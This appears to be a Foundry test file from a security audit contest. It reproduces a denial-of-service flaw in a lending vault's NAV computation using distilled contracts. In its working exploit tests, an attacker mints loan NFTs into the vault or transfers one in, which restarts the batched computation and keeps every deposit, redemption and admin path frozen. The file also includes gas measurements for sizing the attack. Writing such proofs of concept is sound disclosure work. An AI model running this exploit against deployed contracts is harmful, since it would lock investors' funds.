// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.33;

import {Test, console} from "forge-std/Test.sol";
// (contracts inlined below)


// =============================================================================
//  Faithful distillation of the two Tare contracts that combine to produce the
//  navStart freeze. The vulnerable control flow is copied VERBATIM from the
//  contest source; only the surrounding plumbing (roles, ERC20, the calculator's
//  arithmetic) is reduced to the minimum needed to execute it.
//
//  Verbatim from contracts/PortfolioVault.sol : updateNav, _requireIdleNav,
//      _requireFreshNav, _removeLoanFromNav, _addLoanToNav, _invalidateNav
//  Verbatim from contracts/LoansNFT.sol       : the _update ownership-nonce block
//
//  MiniLoans.getLoanValues performs the same per-loan cold-storage read pattern
//  as the real one (four ledger-account SLOADs plus the LoanData struct slot),
//  so the gas benchmark is representative rather than decorative.
// =============================================================================

/// @notice Stand-in for LoansNFT. The `_update` nonce block is the real one.
contract MiniLoansNFT {
  mapping(uint256 tokenId => address) internal _owners;

  /// @dev Same declaration as the contest source.
  mapping(address account => uint256 nonce) public ownershipNonce;

  address public immutable LOANS_CONTRACT;

  error NonexistentToken();

  constructor(address loansContract) {
    LOANS_CONTRACT = loansContract;
  }

  function ownerOf(uint256 tokenId) external view returns (address) {
    address o = _owners[tokenId];
    if (o == address(0)) revert NonexistentToken();
    return o;
  }

  /// @dev Mirrors LoansNFT.mint: only the Loans contract may mint.
  function mint(address to, uint256 tokenId) external {
    require(msg.sender == LOANS_CONTRACT, "only loans");
    _update(to, tokenId);
  }

  /// @dev Plain ERC-721 transfer. Non-safe, exactly as the protocol uses everywhere.
  function transferFrom(address from, address to, uint256 tokenId) external {
    require(_owners[tokenId] == from, "wrong from");
    require(msg.sender == from, "not owner");
    _update(to, tokenId);
  }

  function _update(address to, uint256 tokenId) internal {
    address from = _owners[tokenId];

    // ---- VERBATIM from LoansNFT._update ------------------------------------
    // Bump per-address ownership nonce so external integrators can detect any
    // change to the NFT ownership set of a given address. The zero address is
    // skipped (mint's `from`, burn's `to`) because no consumer reads that slot.
    unchecked {
      if (from != address(0)) ++ownershipNonce[from];
      if (to != address(0)) ++ownershipNonce[to];
    }
    // ------------------------------------------------------------------------

    _owners[tokenId] = to;
  }
}

/// @notice Stand-in for Loans. `create` reproduces the mint-to-investor path and
///         the fact that no tokens move; `getLoanValues` reproduces the read cost.
contract MiniLoans {
  MiniLoansNFT public loansNFT;
  uint64 public loanCount;

  // Per-loan ledger accounts, matching the four the real getLoanValues reads.
  mapping(uint64 => mapping(uint8 => int128)) internal _accounts;
  mapping(uint64 => uint256) internal _loanData; // packed status + nextDueDate

  // The originator's self-curated address book (permissionless per caller, #14).
  mapping(address => mapping(address => bool)) public bookInvestor;

  function setLoansNFT(address nft) external {
    loansNFT = MiniLoansNFT(nft);
  }

  function registerInvestor(address investor) external {
    bookInvestor[msg.sender][investor] = true;
  }

  /// @dev Reproduces Loans._create: investor validated ONLY against the
  ///      originator's own book, then minted to unconditionally. No token moves.
  function create(address investor) external returns (uint64 loanId) {
    require(bookInvestor[msg.sender][investor], "unregistered investor");
    loanId = ++loanCount;
    _loanData[loanId] = (1 << 128) | uint256(block.timestamp + 30 days);
    _accounts[loanId][1] = -1000e6;
    _accounts[loanId][2] = 0;
    _accounts[loanId][3] = 0;
    _accounts[loanId][4] = 0;
    loansNFT.mint(investor, uint256(loanId));
  }

  /// @dev Same read shape as the real getLoanValues: four ledger SLOADs plus the
  ///      LoanData slot, per loan, into a returned memory array.
  function getLoansValue(uint64[] memory loanIds) external view returns (uint256 total) {
    uint256 n = loanIds.length;
    for (uint256 i; i < n; ++i) {
      uint64 id = loanIds[i];
      int128 outstanding = -_accounts[id][1] - _accounts[id][2];
      int128 principalWithdrawable = _accounts[id][3];
      int128 interestWithdrawable = _accounts[id][4];
      uint256 packed = _loanData[id];

      int256 collectedCash = int256(principalWithdrawable) + int256(interestWithdrawable);
      if (collectedCash < 0) collectedCash = 0;
      int256 unreturned = int256(outstanding) - int256(principalWithdrawable);
      if (unreturned < 0) unreturned = 0;

      uint256 factor = (packed >> 128) == 1 ? 1e18 : 0.05e18;
      total += (uint256(unreturned) * factor) / 1e18 + uint256(collectedCash);
    }
  }
}

/// @notice Stand-in for NavCalculator: only the two members updateNav touches.
contract MiniCalculator {
  uint256 public configurationVersion = 1;

  function applyPortfolioAdjustment(uint256 rawValue) external pure returns (uint256) {
    return rawValue;
  }

  function bump() external {
    ++configurationVersion;
  }
}

/// @notice Stand-in for PortfolioVault. updateNav and the two gates are verbatim.
contract MiniVault {
  MiniLoansNFT public loansNFT;
  MiniCalculator public calculator;
  MiniLoans public loans;

  uint256 public navCursor;
  uint256 public pendingNav;
  uint256 public navStart;
  uint256 public lastNav;
  uint256 public lastNavUpdate;
  uint256 public lastOwnershipNonce;
  uint256 public lastCalculatorConfigurationVersion;

  uint64[] internal _navLoanIds;
  mapping(uint64 => uint256) internal _navLoanIndex;

  uint256 public totalPendingDepositAssets;
  uint256 public totalClaimableRedeemAssets;
  uint256 public idleAssets; // stands in for assetToken.balanceOf(address(this))

  uint256 public maxNavAge;
  uint256 public maxNavComputationTime;

  error NavComputationInProgress();
  error ZeroNav();
  error PortfolioHoldingsChanged();
  error CalculatorConfigurationChanged();
  error StaleNav();
  error ZeroAmount();

  event NavComputationStarted(uint256 timestamp);
  event NavUpdated(uint256 nav, uint256 timestamp);
  event LoanAddedToNav(uint64 loanId);
  event LoanRemovedFromNav(uint64 loanId);
  event NavInvalidated();

  constructor(
    MiniLoansNFT _nft,
    MiniCalculator _calc,
    MiniLoans _loans,
    uint256 _maxNavAge,
    uint256 _maxNavComputationTime
  ) {
    loansNFT = _nft;
    calculator = _calc;
    loans = _loans;
    maxNavAge = _maxNavAge;
    maxNavComputationTime = _maxNavComputationTime;
  }

  function seedAssets(uint256 amount) external {
    idleAssets += amount;
  }

  function addLoansToNav(uint64[] calldata loanIds) external {
    _requireIdleNav();
    bool changed;
    uint256 length = loanIds.length;
    for (uint256 i; i < length; ++i) {
      uint64 loanId = loanIds[i];
      require(loansNFT.ownerOf(uint256(loanId)) == address(this), "LoanNotOwned");
      if (_navLoanIndex[loanId] == 0) {
        _addLoanToNav(loanId);
        changed = true;
      }
    }
    if (changed) _invalidateNav();
  }

  // =========================================================================
  //  VERBATIM from PortfolioVault.updateNav. Only the two external calls are
  //  retargeted at the mini contracts; every branch, assignment and ordering
  //  is unchanged.
  // =========================================================================
  function updateNav(uint256 batchSize) external {
    require(batchSize > 0, ZeroAmount());

    MiniLoansNFT loansNFT_ = loansNFT;
    MiniCalculator calculator_ = calculator;
    MiniLoans loans_ = loans;

    uint256 currentNonce = loansNFT_.ownershipNonce(address(this));
    uint256 currentConfigurationVersion = calculator_.configurationVersion();
    if (navStart == 0) {
      navStart = block.timestamp;
      lastOwnershipNonce = currentNonce;
      lastCalculatorConfigurationVersion = currentConfigurationVersion;
      emit NavComputationStarted(block.timestamp);
    } else if (
      currentNonce != lastOwnershipNonce ||
      currentConfigurationVersion != lastCalculatorConfigurationVersion ||
      block.timestamp - navStart > maxNavComputationTime
    ) {
      // Restart if the vault's NFT holdings changed mid-cycle, calculator
      // factors changed, or the previous computation took too long.
      navStart = block.timestamp;
      navCursor = 0;
      pendingNav = 0;
      lastOwnershipNonce = currentNonce;
      lastCalculatorConfigurationVersion = currentConfigurationVersion;
      emit NavComputationStarted(block.timestamp);
    }

    uint256 cursor = navCursor;
    uint64[] memory owned = new uint64[](batchSize);
    uint256 ownedCount;

    for (uint256 i; i < batchSize; ++i) {
      if (cursor >= _navLoanIds.length) break;
      uint64 loanId = _navLoanIds[cursor];
      bool owns;
      try loansNFT_.ownerOf(uint256(loanId)) returns (address owner) {
        owns = owner == address(this);
      } catch {
        owns = false;
      }
      if (owns) {
        owned[ownedCount++] = loanId;
        unchecked {
          ++cursor;
        }
      } else {
        _removeLoanFromNav(loanId);
      }
    }

    if (ownedCount > 0) {
      assembly {
        mstore(owned, ownedCount)
      }
      pendingNav += loans_.getLoansValue(owned);
    }

    navCursor = cursor;

    if (cursor >= _navLoanIds.length) {
      lastNav =
        idleAssets +
        calculator_.applyPortfolioAdjustment(pendingNav) -
        totalPendingDepositAssets -
        totalClaimableRedeemAssets;
      lastNavUpdate = block.timestamp;
      navCursor = 0;
      pendingNav = 0;
      navStart = 0;
      emit NavUpdated(lastNav, block.timestamp);
    }
  }

  // --- the two gates, verbatim ---------------------------------------------

  function requireFreshNav() external view {
    _requireFreshNav();
  }

  function requireIdleNav() external view {
    _requireIdleNav();
  }

  function _requireFreshNav() internal view {
    require(navStart == 0, NavComputationInProgress());
    require(lastNav > 0, ZeroNav());
    require(loansNFT.ownershipNonce(address(this)) == lastOwnershipNonce, PortfolioHoldingsChanged());
    require(calculator.configurationVersion() == lastCalculatorConfigurationVersion, CalculatorConfigurationChanged());
    require(block.timestamp - lastNavUpdate <= maxNavAge, StaleNav());
  }

  function _requireIdleNav() internal view {
    require(navStart == 0, NavComputationInProgress());
  }

  // --- the gated entry points, reduced to their gate ------------------------

  function approveDeposit() external view {
    _requireFreshNav();
  }

  function approveRedemption() external view {
    _requireFreshNav();
  }

  function collectCashflows() external view {
    _requireIdleNav();
  }

  function fundLoans() external view {
    _requireIdleNav();
  }

  function transferLoans() external view {
    _requireIdleNav();
  }

  function setLoans() external view {
    _requireIdleNav();
  }

  function setCalculator() external view {
    _requireIdleNav();
  }

  // --- the levers admin/guardian actually has -------------------------------

  function setMaxNavAge(uint256 v) external {
    maxNavAge = v;
  }

  function setMaxNavComputationTime(uint256 v) external {
    maxNavComputationTime = v;
  }

  // --- internals, verbatim ---------------------------------------------------

  function navLoanCount() external view returns (uint256) {
    return _navLoanIds.length;
  }

  function _addLoanToNav(uint64 loanId) internal {
    if (_navLoanIndex[loanId] != 0) return;
    _navLoanIds.push(loanId);
    _navLoanIndex[loanId] = _navLoanIds.length;
    emit LoanAddedToNav(loanId);
  }

  function _removeLoanFromNav(uint64 loanId) internal {
    uint256 idx = _navLoanIndex[loanId];
    if (idx == 0) return;
    uint256 lastIdx = _navLoanIds.length;
    if (idx != lastIdx) {
      uint64 lastId = _navLoanIds[lastIdx - 1];
      _navLoanIds[idx - 1] = lastId;
      _navLoanIndex[lastId] = idx;
    }
    _navLoanIds.pop();
    _navLoanIndex[loanId] = 0;
    emit LoanRemovedFromNav(loanId);
  }

  function _invalidateNav() internal {
    lastNavUpdate = 0;
    emit NavInvalidated();
  }
}


contract NavFreezeTest is Test {
  MiniLoans internal loans;
  MiniLoansNFT internal nft;
  MiniCalculator internal calc;
  MiniVault internal vault;

  address internal attacker = address(0xA77ACc);
  address internal honestOriginator = address(0x0125);

  uint256 internal constant PORTFOLIO_SIZE = 40;
  uint256 internal constant BATCH_SIZE = 10;
  uint256 internal constant MAX_NAV_AGE = 4 hours;
  uint256 internal constant MAX_NAV_COMPUTATION_TIME = 1 hours;

  function setUp() public {
    loans = new MiniLoans();
    nft = new MiniLoansNFT(address(loans));
    loans.setLoansNFT(address(nft));
    calc = new MiniCalculator();
    vault = new MiniVault(nft, calc, loans, MAX_NAV_AGE, MAX_NAV_COMPUTATION_TIME);

    // Honest originator builds the vault's real portfolio.
    vm.prank(honestOriginator);
    loans.registerInvestor(address(vault));

    uint64[] memory ids = new uint64[](PORTFOLIO_SIZE);
    for (uint256 i; i < PORTFOLIO_SIZE; ++i) {
      vm.prank(honestOriginator);
      ids[i] = loans.create(address(vault));
    }
    vault.addLoansToNav(ids);
    vault.seedAssets(1_000_000e6);

    // Attacker registers the vault in its OWN book. Permissionless (known issue #14).
    vm.prank(attacker);
    loans.registerInvestor(address(vault));

    _sweepToCompletion();
    assertEq(vault.navStart(), 0, "setup: vault idle");
    assertGt(vault.lastNav(), 0, "setup: NAV established");
  }

  // =========================================================================
  //  The finding.
  // =========================================================================

  function test_attackerHoldsNavStartOpenIndefinitely() public {
    uint256 cleanBatches = PORTFOLIO_SIZE / BATCH_SIZE; // 4 would finish it
    uint256 rounds = cleanBatches * 5; // 20 -- five times what is needed

    uint256 managerGas;
    uint256 attackerGas;
    uint256 maxCursorReached;

    for (uint256 r; r < rounds; ++r) {
      uint256 g = gasleft();
      vault.updateNav(BATCH_SIZE);
      managerGas += g - gasleft();

      if (vault.navCursor() > maxCursorReached) maxCursorReached = vault.navCursor();
      assertGt(vault.navStart(), 0, "cycle must still be open");

      // One free mint straight into the vault. No tokens move.
      vm.prank(attacker);
      g = gasleft();
      loans.create(address(vault));
      attackerGas += g - gasleft();

      vm.roll(block.number + 1);
      vm.warp(block.timestamp + 12);
    }

    assertGt(vault.navStart(), 0, "navStart never cleared -- the vault is frozen");
    assertLe(maxCursorReached, BATCH_SIZE, "cursor never advanced past a single batch");

    console.log("rounds run                    ", rounds);
    console.log("batches a clean sweep needs   ", cleanBatches);
    console.log("furthest cursor ever reached  ", maxCursorReached);
    console.log("total gas burned by manager   ", managerGas);
    console.log("total gas spent by attacker   ", attackerGas);
    console.log("cost ratio (manager/attacker) ", managerGas / attackerGas);
  }

  /// @notice Route A: no originator approval, no privileged role at all --
  ///         just somebody who owns one loan NFT and pushes it in.
  function test_routeA_plainTransferByAnyNftHolder() public {
    address civilian = address(0xC1F);
    vm.prank(civilian);
    loans.registerInvestor(civilian);
    vm.prank(civilian);
    uint64 ownNft = loans.create(civilian); // civilian's own loan, nothing to do with the vault

    vault.updateNav(BATCH_SIZE);
    assertGt(vault.navStart(), 0);
    uint256 cursorBefore = vault.navCursor();
    assertEq(cursorBefore, BATCH_SIZE);

    // Unsolicited push. The vault has no hook with which to refuse it.
    vm.prank(civilian);
    nft.transferFrom(civilian, address(vault), uint256(ownNft));

    vault.updateNav(BATCH_SIZE);
    assertEq(vault.navCursor(), BATCH_SIZE, "progress was discarded and restarted from zero");
    assertGt(vault.navStart(), 0, "still frozen");
  }

  /// @notice The blast radius: every gated entry point reverts with the same error.
  function test_everyPrivilegedPathIsGatedBehindTheStuckFlag() public {
    vault.updateNav(BATCH_SIZE);
    vm.prank(attacker);
    loans.create(address(vault));
    vault.updateNav(BATCH_SIZE);
    assertGt(vault.navStart(), 0);

    bytes4 err = MiniVault.NavComputationInProgress.selector;

    vm.expectRevert(err);
    vault.approveDeposit();
    vm.expectRevert(err);
    vault.approveRedemption();
    vm.expectRevert(err);
    vault.collectCashflows();
    vm.expectRevert(err);
    vault.fundLoans();
    vm.expectRevert(err);
    vault.transferLoans();
    vm.expectRevert(err);
    vault.setLoans();
    vm.expectRevert(err);
    vault.setCalculator();
  }

  /// @notice No configuration lever clears navStart.
  function test_noAdminLeverClearsNavStart() public {
    vault.updateNav(BATCH_SIZE);
    assertGt(vault.navStart(), 0);

    vault.setMaxNavComputationTime(365 days);
    assertGt(vault.navStart(), 0, "raising maxNavComputationTime does not clear it");

    vault.setMaxNavAge(365 days);
    assertGt(vault.navStart(), 0, "raising maxNavAge does not clear it");
  }

  /// @notice Control: same portfolio, no attacker, finalises normally.
  function test_control_sweepCompletesWithoutInterference() public {
    vault.updateNav(BATCH_SIZE);
    assertGt(vault.navStart(), 0, "cycle opens");
    _sweepToCompletion();
    assertEq(vault.navStart(), 0, "finalises when left alone");
    assertEq(vault.lastNavUpdate(), block.timestamp, "NAV is fresh again");
  }

  /// @notice Boundary: if the whole sweep fits in ONE call, the attack fails.
  ///         This is the precondition, demonstrated rather than asserted.
  function test_boundary_singleTransactionSweepIsImmune() public {
    vault.updateNav(BATCH_SIZE); // open a cycle
    vm.prank(attacker);
    loans.create(address(vault)); // attacker bumps the nonce

    // Manager sweeps everything in one call: restart happens, then the full
    // sweep completes inside the same transaction, so it finalises anyway.
    vault.updateNav(vault.navLoanCount() + 1);
    assertEq(vault.navStart(), 0, "atomic sweep is immune to the interleaved bump");
  }

  // =========================================================================
  //  Gas: what portfolio size makes a single-transaction sweep impossible?
  // =========================================================================

  function test_gas_derivePortfolioSizeThreshold() public {
    // Measure the marginal cost of one more loan in a sweep.
    uint256 gasFor10 = _measureSweepGas(10);
    uint256 gasFor40 = _measureSweepGas(40);
    uint256 perLoan = (gasFor40 - gasFor10) / 30;

    console.log("gas: sweep of 10 loans        ", gasFor10);
    console.log("gas: sweep of 40 loans        ", gasFor40);
    console.log("gas: marginal cost per loan   ", perLoan);

    // Headroom for a transaction: block gas limit minus the fixed overhead.
    uint256 fixedOverhead = gasFor10 - 10 * perLoan;
    console.log("gas: fixed overhead per call  ", fixedOverhead);

    uint256 n30 = (30_000_000 - fixedOverhead) / perLoan;
    uint256 n45 = (45_000_000 - fixedOverhead) / perLoan;
    console.log("max loans in one tx @30M limit", n30);
    console.log("max loans in one tx @45M limit", n45);
    console.log("-> multi-batch (attackable) above this many loans");

    assertGt(perLoan, 0, "per-loan cost must be measurable");
  }

  function _measureSweepGas(uint256 n) internal returns (uint256 used) {
    MiniLoans l = new MiniLoans();
    MiniLoansNFT f = new MiniLoansNFT(address(l));
    l.setLoansNFT(address(f));
    MiniCalculator c = new MiniCalculator();
    MiniVault v = new MiniVault(f, c, l, MAX_NAV_AGE, MAX_NAV_COMPUTATION_TIME);

    vm.prank(honestOriginator);
    l.registerInvestor(address(v));
    uint64[] memory ids = new uint64[](n);
    for (uint256 i; i < n; ++i) {
      vm.prank(honestOriginator);
      ids[i] = l.create(address(v));
    }
    v.addLoansToNav(ids);
    v.seedAssets(1e12);

    uint256 g = gasleft();
    v.updateNav(n);
    used = g - gasleft();
    require(v.navStart() == 0, "measurement sweep must finalise");
  }

  function _sweepToCompletion() internal {
    for (uint256 i; i < 100; ++i) {
      vault.updateNav(BATCH_SIZE);
      if (vault.navStart() == 0) return;
    }
    revert("sweep did not finalise");
  }
}
